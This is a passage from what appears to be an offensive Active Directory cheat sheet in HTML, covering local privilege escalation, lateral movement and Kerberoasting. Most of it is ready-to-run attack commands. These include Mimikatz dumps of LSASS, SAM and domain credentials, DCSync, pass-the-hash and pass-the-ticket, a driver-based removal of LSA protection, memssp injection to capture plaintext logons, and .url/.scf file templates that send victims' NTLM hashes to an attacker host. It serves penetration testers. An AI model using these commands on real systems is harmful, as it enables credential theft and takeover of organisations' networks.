<li><a href="https://github.com/dirkjanm/adidnsdump">adidnsdump</a> Integrated DNS dumping by any authenticated user</li>
<li><a href="https://github.com/cyberark/ACLight">ACLight</a> Advanced Discovery of Privileged Accounts</li>
<li><a href="https://github.com/sense-of-security/ADRecon">ADRecon</a> Detailed Active Directory Recon Tool</li>
</ul>
<h2 id="local-privilege-escalation">Local Privilege Escalation</h2>
<ul>
<li>
<p><a href="https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook">Windows Local Privilege Escalation Cookbook</a> Cookbook for Windows Local Privilege Escalations</p>
</li>
<li>
<p><a href="https://github.com/ohpe/juicy-potato">Juicy Potato</a> Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation</p>
</li>
</ul>
<p>:warning: Works only until Windows Server 2016 and Windows 10 until patch 1803</p>
<ul>
<li><a href="https://github.com/TsukiCTF/Lovely-Potato">Lovely Potato</a> Automated Juicy Potato</li>
</ul>
<p>:warning: Works only until Windows Server 2016 and Windows 10 until patch 1803</p>
<ul>
<li><a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> Exploit the PrinterBug for System Impersonation</li>
</ul>
<p>:pray: Works for Windows Server 2019 and Windows 10</p>
<ul>
<li><a href="https://github.com/antonioCoco/RoguePotato">RoguePotato</a> Upgraded Juicy Potato</li>
</ul>
<p>:pray: Works for Windows Server 2019 and Windows 10</p>
<ul>
<li><a href="https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/">Abusing Token Privileges</a></li>
<li><a href="https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/">SMBGhost CVE-2020-0796</a> \
  <a href="https://github.com/danigargu/CVE-2020-0796">PoC</a></li>
<li>
<p><a href="https://github.com/cube0x0/CVE-2021-36934">CVE-2021-36934 (HiveNightmare/SeriousSAM)</a></p>
</li>
<li>
<p>Useful Local Priv Esc Tools</p>
</li>
<li>
<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1">PowerUp</a> Misconfiguration Abuse</p>
</li>
<li><a href="https://github.com/AlessandroZ/BeRoot">BeRoot</a> General Priv Esc Enumeration Tool</li>
<li><a href="https://github.com/enjoiz/Privesc">Privesc</a> General Priv Esc Enumeration Tool</li>
<li><a href="https://github.com/itm4n/FullPowers">FullPowers</a> Restore A Service Account's Privileges</li>
</ul>
<h2 id="lateral-movement">Lateral Movement</h2>
<ul>
<li>PowerShell Remoting</li>
</ul>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c">#Enable PowerShell Remoting on current Machine (Needs Admin Access)</span>
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="nb">Enable-PSRemoting</span>
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>
</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="c">#Entering or Starting a new PSSession (Needs Admin Access)</span>
</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="nv">$sess</span> <span class="p">=</span> <span class="nb">New-PSSession</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">Name</span><span class="p">&gt;</span>
</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">Name</span><span class="p">&gt;</span> <span class="n">OR</span> <span class="n">-Sessions</span> <span class="p">&lt;</span><span class="n">SessionName</span><span class="p">&gt;</span>
</span></code></pre></div>
<ul>
<li>Remote Code Execution with PS Credentials</li>
</ul>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="nv">$SecPassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;&lt;Wtver&gt;&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="nv">$Cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;htb.local\&lt;WtverUser&gt;&#39;</span><span class="p">,</span> <span class="nv">$SecPassword</span><span class="p">)</span>
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">WtverMachine</span><span class="p">&gt;</span> <span class="n">-Credential</span> <span class="nv">$Cred</span> <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="n">whoami</span><span class="p">}</span>
</span></code></pre></div>
<ul>
<li>Import a PowerShell Module and Execute its Functions Remotely</li>
</ul>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c">#Execute the command and start a session</span>
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="nb">Invoke-Command</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">NameOfComputer</span><span class="p">&gt;</span> <span class="n">-FilePath</span> <span class="n">c</span><span class="p">:\</span><span class="n">FilePath</span><span class="p">\</span><span class="n">file</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Session</span> <span class="nv">$sess</span>
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="c">#Interact with the session</span>
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="nb">Enter-PSSession</span> <span class="n">-Session</span> <span class="nv">$sess</span>
</span></code></pre></div>
<ul>
<li>Executing Remote Stateful commands</li>
</ul>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c">#Create a new session</span>
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="nv">$sess</span> <span class="p">=</span> <span class="nb">New-PSSession</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">NameOfComputer</span><span class="p">&gt;</span>
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>
</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="c">#Execute command on the session</span>
</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="nb">Invoke-Command</span> <span class="n">-Session</span> <span class="nv">$sess</span> <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="nv">$ps</span> <span class="p">=</span> <span class="nb">Get-Process</span><span class="p">}</span>
</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>
</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="c">#Check the result of the command to confirm we have an interactive session</span>
</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="nb">Invoke-Command</span> <span class="n">-Session</span> <span class="nv">$sess</span> <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="nv">$ps</span><span class="p">}</span>
</span></code></pre></div>
<ul>
<li>Mimikatz</li>
</ul>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c">#The commands are in cobalt strike format!</span>
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="c">#Dump LSASS:</span>
</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="n">mimikatz</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="n">mimikatz</span> <span class="n">token</span><span class="p">::</span><span class="n">elevate</span>
</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a><span class="n">mimikatz</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">logonpasswords</span>
</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>
</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a><span class="c">#(Over) Pass The Hash</span>
</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a><span class="n">mimikatz</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a><span class="n">mimikatz</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">pth</span> <span class="p">/</span><span class="n">user</span><span class="p">:&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">ntlm</span><span class="p">:&lt;&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">DomainFQDN</span><span class="p">&gt;</span>
</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a>
</span><span id="__span-25-12"><a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a><span class="c">#List all available kerberos tickets in memory</span>
</span><span id="__span-25-13"><a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a><span class="n">mimikatz</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">tickets</span>
</span><span id="__span-25-14"><a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a>
</span><span id="__span-25-15"><a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a><span class="c">#Dump local Terminal Services credentials</span>
</span><span id="__span-25-16"><a id="__codelineno-25-16" name="__codelineno-25-16" href="#__codelineno-25-16"></a><span class="n">mimikatz</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">tspkg</span>
</span><span id="__span-25-17"><a id="__codelineno-25-17" name="__codelineno-25-17" href="#__codelineno-25-17"></a>
</span><span id="__span-25-18"><a id="__codelineno-25-18" name="__codelineno-25-18" href="#__codelineno-25-18"></a><span class="c">#Dump and save LSASS in a file</span>
</span><span id="__span-25-19"><a id="__codelineno-25-19" name="__codelineno-25-19" href="#__codelineno-25-19"></a><span class="n">mimikatz</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">minidump</span> <span class="n">c</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">lsass</span><span class="p">.</span><span class="n">dmp</span>
</span><span id="__span-25-20"><a id="__codelineno-25-20" name="__codelineno-25-20" href="#__codelineno-25-20"></a>
</span><span id="__span-25-21"><a id="__codelineno-25-21" name="__codelineno-25-21" href="#__codelineno-25-21"></a><span class="c">#List cached MasterKeys</span>
</span><span id="__span-25-22"><a id="__codelineno-25-22" name="__codelineno-25-22" href="#__codelineno-25-22"></a><span class="n">mimikatz</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">dpapi</span>
</span><span id="__span-25-23"><a id="__codelineno-25-23" name="__codelineno-25-23" href="#__codelineno-25-23"></a>
</span><span id="__span-25-24"><a id="__codelineno-25-24" name="__codelineno-25-24" href="#__codelineno-25-24"></a><span class="c">#List local Kerberos AES Keys</span>
</span><span id="__span-25-25"><a id="__codelineno-25-25" name="__codelineno-25-25" href="#__codelineno-25-25"></a><span class="n">mimikatz</span> <span class="n">sekurlsa</span><span class="p">::</span><span class="n">ekeys</span>
</span><span id="__span-25-26"><a id="__codelineno-25-26" name="__codelineno-25-26" href="#__codelineno-25-26"></a>
</span><span id="__span-25-27"><a id="__codelineno-25-27" name="__codelineno-25-27" href="#__codelineno-25-27"></a><span class="c">#Dump SAM Database</span>
</span><span id="__span-25-28"><a id="__codelineno-25-28" name="__codelineno-25-28" href="#__codelineno-25-28"></a><span class="n">mimikatz</span> <span class="n">lsadump</span><span class="p">::</span><span class="n">sam</span>
</span><span id="__span-25-29"><a id="__codelineno-25-29" name="__codelineno-25-29" href="#__codelineno-25-29"></a>
</span><span id="__span-25-30"><a id="__codelineno-25-30" name="__codelineno-25-30" href="#__codelineno-25-30"></a><span class="c">#Dump SECRETS Database</span>
</span><span id="__span-25-31"><a id="__codelineno-25-31" name="__codelineno-25-31" href="#__codelineno-25-31"></a><span class="n">mimikatz</span> <span class="n">lsadump</span><span class="p">::</span><span class="n">secrets</span>
</span><span id="__span-25-32"><a id="__codelineno-25-32" name="__codelineno-25-32" href="#__codelineno-25-32"></a>
</span><span id="__span-25-33"><a id="__codelineno-25-33" name="__codelineno-25-33" href="#__codelineno-25-33"></a><span class="c">#Inject and dump the Domain Controler&#39;s Credentials</span>
</span><span id="__span-25-34"><a id="__codelineno-25-34" name="__codelineno-25-34" href="#__codelineno-25-34"></a><span class="n">mimikatz</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
</span><span id="__span-25-35"><a id="__codelineno-25-35" name="__codelineno-25-35" href="#__codelineno-25-35"></a><span class="n">mimikatz</span> <span class="n">token</span><span class="p">::</span><span class="n">elevate</span>
</span><span id="__span-25-36"><a id="__codelineno-25-36" name="__codelineno-25-36" href="#__codelineno-25-36"></a><span class="n">mimikatz</span> <span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="p">/</span><span class="n">inject</span>
</span><span id="__span-25-37"><a id="__codelineno-25-37" name="__codelineno-25-37" href="#__codelineno-25-37"></a>
</span><span id="__span-25-38"><a id="__codelineno-25-38" name="__codelineno-25-38" href="#__codelineno-25-38"></a><span class="c">#Dump the Domain&#39;s Credentials without touching DC&#39;s LSASS and also remotely</span>
</span><span id="__span-25-39"><a id="__codelineno-25-39" name="__codelineno-25-39" href="#__codelineno-25-39"></a><span class="n">mimikatz</span> <span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">DomainFQDN</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">all</span>
</span><span id="__span-25-40"><a id="__codelineno-25-40" name="__codelineno-25-40" href="#__codelineno-25-40"></a>
</span><span id="__span-25-41"><a id="__codelineno-25-41" name="__codelineno-25-41" href="#__codelineno-25-41"></a><span class="c">#Dump old passwords and NTLM hashes of a user</span>
</span><span id="__span-25-42"><a id="__codelineno-25-42" name="__codelineno-25-42" href="#__codelineno-25-42"></a><span class="n">mimikatz</span> <span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">user</span><span class="p">:&lt;</span><span class="n">DomainFQDN</span><span class="p">&gt;\&lt;</span><span class="n">user</span><span class="p">&gt;</span> <span class="p">/</span><span class="nb">history</span>
</span><span id="__span-25-43"><a id="__codelineno-25-43" name="__codelineno-25-43" href="#__codelineno-25-43"></a>
</span><span id="__span-25-44"><a id="__codelineno-25-44" name="__codelineno-25-44" href="#__codelineno-25-44"></a><span class="c">#List and Dump local kerberos credentials</span>
</span><span id="__span-25-45"><a id="__codelineno-25-45" name="__codelineno-25-45" href="#__codelineno-25-45"></a><span class="n">mimikatz</span> <span class="n">kerberos</span><span class="p">::</span><span class="n">list</span> <span class="p">/</span><span class="n">dump</span>
</span><span id="__span-25-46"><a id="__codelineno-25-46" name="__codelineno-25-46" href="#__codelineno-25-46"></a>
</span><span id="__span-25-47"><a id="__codelineno-25-47" name="__codelineno-25-47" href="#__codelineno-25-47"></a><span class="c">#Pass The Ticket</span>
</span><span id="__span-25-48"><a id="__codelineno-25-48" name="__codelineno-25-48" href="#__codelineno-25-48"></a><span class="n">mimikatz</span> <span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="p">&lt;</span><span class="n">PathToKirbiFile</span><span class="p">&gt;</span>
</span><span id="__span-25-49"><a id="__codelineno-25-49" name="__codelineno-25-49" href="#__codelineno-25-49"></a>
</span><span id="__span-25-50"><a id="__codelineno-25-50" name="__codelineno-25-50" href="#__codelineno-25-50"></a><span class="c">#List TS/RDP sessions</span>
</span><span id="__span-25-51"><a id="__codelineno-25-51" name="__codelineno-25-51" href="#__codelineno-25-51"></a><span class="n">mimikatz</span> <span class="n">ts</span><span class="p">::</span><span class="n">sessions</span>
</span><span id="__span-25-52"><a id="__codelineno-25-52" name="__codelineno-25-52" href="#__codelineno-25-52"></a>
</span><span id="__span-25-53"><a id="__codelineno-25-53" name="__codelineno-25-53" href="#__codelineno-25-53"></a><span class="c">#List Vault credentials</span>
</span><span id="__span-25-54"><a id="__codelineno-25-54" name="__codelineno-25-54" href="#__codelineno-25-54"></a><span class="n">mimikatz</span> <span class="n">vault</span><span class="p">::</span><span class="n">list</span>
</span></code></pre></div>
<p>:exclamation: What if mimikatz fails to dump credentials because of LSA Protection controls ?</p>
<ul>
<li>LSA as a Protected Process (Kernel Land Bypass)</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>  #Check if LSA runs as a protected process by looking if the variable &quot;RunAsPPL&quot; is set to 0x1
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>
</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>  #Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>  #Now lets import the mimidriver.sys to the system
</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>  mimikatz # !+
</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>
</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>  #Now lets remove the protection flags from lsass.exe process
</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>  mimikatz # !processprotect /process:lsass.exe /remove
</span><span id="__span-26-10"><a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>
</span><span id="__span-26-11"><a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a>  #Finally run the logonpasswords function to dump lsass
</span><span id="__span-26-12"><a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a>  mimikatz # sekurlsa::logonpasswords
</span></code></pre></div>
<ul>
<li>
<p>LSA as a Protected Process (Userland "Fileless" Bypass)</p>
</li>
<li>
<p><a href="https://github.com/itm4n/PPLdump">PPLdump</a></p>
</li>
<li>
<p><a href="https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland">Bypassing LSA Protection in Userland</a></p>
</li>
<li>
<p>LSA is running as virtualized process (LSAISO) by Credential Guard</p>
</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>  #Check if a process called lsaiso.exe exists on the running processes
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>  tasklist |findstr lsaiso
</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>
</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>  #If it does there isn&#39;t a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>  #Lets inject our own malicious Security Support Provider into memory, for this example i&#39;ll use the one mimikatz provides
</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>  mimikatz # misc::memssp
</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>
</span><span id="__span-27-8"><a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a>  #Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
</span></code></pre></div>
<ul>
<li><a href="https://adsecurity.org/?page_id=1821">Detailed Mimikatz Guide</a></li>
<li>
<p><a href="https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a">Poking Around With 2 lsass Protection Options</a></p>
</li>
<li>
<p>Remote Desktop Protocol</p>
</li>
</ul>
<p>If the host we want to lateral move to has "RestrictedAdmin" enabled, we can pass the hash using the RDP protocol and get an interactive session without the plaintext password.</p>
<ul>
<li>Mimikatz:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>  #We execute pass-the-hash using mimikatz and spawn an instance of mstsc.exe with the &quot;/restrictedadmin&quot; flag
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>  privilege::debug
</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>  sekurlsa::pth /user:&lt;Username&gt; /domain:&lt;DomainName&gt; /ntlm:&lt;NTLMHash&gt; /run:&quot;mstsc.exe /restrictedadmin&quot;
</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>
</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>  #Then just click ok on the RDP dialogue and enjoy an interactive session as the user we impersonated
</span></code></pre></div>
<ul>
<li>xFreeRDP:</li>
</ul>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="n">xfreerdp</span>  <span class="p">+</span><span class="n">compression</span> <span class="p">+</span><span class="n">clipboard</span> <span class="p">/</span><span class="n">dynamic-resolution</span> <span class="p">+</span><span class="n">toggle-fullscreen</span> <span class="p">/</span><span class="n">cert-ignore</span> <span class="p">/</span><span class="n">bpp</span><span class="p">:</span><span class="n">8</span>  <span class="p">/</span><span class="n">u</span><span class="p">:&lt;</span><span class="n">Username</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">pth</span><span class="p">:&lt;</span><span class="n">NTLMHash</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">v</span><span class="p">:&lt;</span><span class="n">Hostname</span> <span class="p">|</span> <span class="n">IPAddress</span><span class="p">&gt;</span>
</span></code></pre></div>
<p>:exclamation: If Restricted Admin mode is disabled on the remote machine we can connect on the host using another tool/protocol like psexec or winrm and enable it by creating the following registry key and setting it's value zero: "HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin".</p>
<ul>
<li>
<p>URL File Attacks</p>
</li>
<li>
<p>.url file</p>
</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>  [InternetShortcut]
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>  URL=whatever
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>  WorkingDirectory=whatever
</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>  IconFile=\\&lt;AttackersIp&gt;\%USERNAME%.icon
</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>  IconIndex=1
</span></code></pre></div>
<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>  [InternetShortcut]
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>  URL=file://&lt;AttackersIp&gt;/leak/leak.html
</span></code></pre></div>
<ul>
<li>.scf file</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>  [Shell]
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>  Command=2
</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>  IconFile=\\&lt;AttackersIp&gt;\Share\test.ico
</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>  [Taskbar]
</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>  Command=ToggleDesktop
</span></code></pre></div>
<p>Putting these files in a writeable share the victim only has to open the file explorer and navigate to the share. <strong>Note</strong> that the file doesn't need to be opened or the user to interact with it, but it must be on the top of the file system or just visible in the windows explorer window in order to be rendered. Use responder to capture the hashes.</p>
<p>:exclamation: .scf file attacks won't work on the latest versions of Windows.</p>
<ul>
<li>
<p>Useful Tools</p>
</li>
<li>
<p><a href="https://github.com/besimorhino/powercat">Powercat</a> netcat written in powershell, and provides tunneling, relay and portforward
  capabilities.</p>
</li>
<li><a href="https://github.com/Mr-Un1k0d3r/SCShell">SCShell</a> fileless lateral movement tool that relies on ChangeServiceConfigA to run command</li>
<li><a href="https://github.com/Hackplayers/evil-winrm">Evil-Winrm</a> the ultimate WinRM shell for hacking/pentesting</li>
<li><a href="https://github.com/antonioCoco/RunasCs">RunasCs</a> Csharp and open version of windows builtin runas.exe</li>
<li><a href="https://github.com/Greenwolf/ntlm_theft.git">ntlm_theft</a> creates all possible file formats for url file attacks</li>
</ul>
<h2 id="domain-privilege-escalation">Domain Privilege Escalation</h2>
<ul>
<li>Kerberoast</li>
</ul>
<p><em>WUT IS DIS?:</em> \
 All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a "user"<br />
 account, extract the encrypted blob that was encrypted using the user's password and bruteforce it offline.</p>
<ul>
<li>PowerView:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>  #Get User Accounts that are used as Service Accounts
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>  Get-NetUser -SPN
</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>
</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>  #Get every available SPN account, request a TGS and dump its hash
</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>  Invoke-Kerberoast
</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>
</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>  #Requesting the TGS for a single account:
</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>  Request-SPNTicket
</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a>
</span><span id="__span-33-10"><a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a>  #Export all tickets using Mimikatz
</span><span id="__span-33-11"><a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a>  Invoke-Mimikatz -Command &#39;&quot;kerberos::list /export&quot;&#39;
</span></code></pre></div>
<ul>
<li>AD Module:</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>  #Get User Accounts that are used as Service Accounts
</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>  Get-ADUser -Filter {ServicePrincipalName -ne &quot;$null&quot;} -Properties ServicePrincipalName
</span></code></pre></div>
<ul>
<li>Impacket:</li>
</ul>
